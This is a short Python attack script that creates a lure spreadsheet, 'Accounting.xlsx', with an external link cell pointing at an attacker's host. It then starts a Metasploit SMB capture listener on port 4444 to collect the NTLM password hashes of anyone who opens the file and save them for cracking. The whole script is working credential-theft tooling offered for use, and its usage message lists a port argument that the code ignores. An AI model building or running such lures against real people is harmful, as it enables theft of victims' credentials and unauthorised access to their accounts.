from os import system
import sys
import time
import xlsxwriter


def createXLSX(filename, server):
	workbook = xlsxwriter.Workbook(filename)
	worksheet = workbook.add_worksheet()
	worksheet.write_url('AZ99', "external://"+server+":4444\\share\\[AccountingBook.xlsx]SheetName'!$C$3:$H$6,2,FALSE)")
	workbook.close()
	print("Fichero creado")

	

def msfListener(ipAttacker):
	resourceFile = open('metasploit.rc','w')
	resourceFile.write('''
use auxiliary/server/capture/smb
set SRVHOST <SERVER>
set SRVPORT 4444
set JOHNPWFILE passwords
run
'''.replace('<SERVER>',ipAttacker))
	resourceFile.close()
	print('[+] MSF Resource file generated ')
	system('msfconsole -q -r metasploit.rc')

def main():
	if(len(sys.argv) < 2):
		print('Usage : Excel-NTLM.py IP_ATTACKER PORT_ATTACKER ')
		print('Example : Excel-NTLM.py 10.10.1.110 445 ')

	else:
		host = sys.argv[1]
		createXLSX("Accounting.xlsx", host)
		msfListener(host)
		
    
    
    
if __name__ == "__main__":
    main()
